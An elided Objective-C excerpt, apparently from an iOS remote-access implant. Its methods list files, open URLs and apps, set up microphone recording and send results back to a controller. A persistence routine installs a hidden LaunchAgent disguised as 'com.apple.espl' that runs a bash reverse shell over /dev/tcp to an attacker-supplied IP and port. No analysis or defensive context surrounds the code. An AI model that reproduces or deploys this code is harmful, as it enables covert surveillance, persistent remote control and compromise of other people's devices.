...
- (NSDictionary*)getDirectoryContents:(NSString*)path {
    ...
    if (dp != NULL) {
        while ((ep = readdir(dp))) { [results setValue:[NSNumber numberWithUnsignedInteger:ep->d_type] forKey:[NSString stringWithFormat:@"%s", ep->d_name]]; }
    } else {
        return nil;
    }
    return results;
...
- (void)showAlert:(NSString*)args {
  ...
  // CFDictionaryAddValue( dict, kCFUserNotificationIconURLKey,
  // CFURLCreateWithString(NULL, CFSTR("/var/mobile/test.png"), NULL) );
    SInt32 error;
...
- (void)openURL:(NSString*)arg {
    if (![arg isEqualToString:@""]) {
        ...
        if (!cu) {
            ...
            if (!ret) {
                [self sendString:[NSString
                stringWithFormat:@"Error opening url %@", arg]];
            }
        }
    }
    [self term];
...
- (void)openApp:(NSString*)arg {
    ...
    kCFAllocatorDefault, [arg UTF8String], kCFStringEncodingUTF8);
    assert(identifier != NULL);
    int ret = SBSLaunchApplicationWithIdentifier(identifier, FALSE);
    if (ret != 0) {
        [self sendString:[NSString stringWithFormat:@"Cannot open app. Is the device locked? (ret: %d)", ret]];
    }
...
- (void)initmic:(NSError*)error {
    ...
    soundSetting = [NSDictionary dictionaryWithObjectsAndKeys:[NSNumber numberWithFloat:44100.0], AVSampleRateKey,
                    [NSNumber numberWithInt:kAudioFormatMPEG4AAC], AVFormatIDKey, [NSNumber numberWithInt:2],
                        AVNumberOfChannelsKey, [NSNumber numberWithInt:AVAudioQualityHigh], AVEncoderAudioQualityKey, nil];
    ...
    // dispatch to allow future killswitch
        dispatch_async(
            dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void) {
                // split cmd by ";" run each separately (this isn't ideal - while
                // true; do echo smh; done)
...
- (void)persistence:(NSString*)args withIP:(NSString*)ip andPort:(int)port {
    ...
    if ([args isEqualToString:@"install"]) {
        ...
        NSDictionary* innerDict = [NSDictionary dictionaryWithObjects: 
            [NSArray arrayWithObjects:[NSNumber numberWithBool:YES], @"com.apple.espl", [NSNumber numberWithInt:5], [NSNumber numberWithBool:YES],
                [NSArray arrayWithObjects:@"sh", @"-c",
                    [NSString stringWithFormat:@"bash &> /dev/tcp/%@/%d 0>&1", ip, port],
                nil],
            nil]
        ...
        [self runTask:@"sleep 1;launchctl unload /Library/LaunchAgents/.espl.plist "
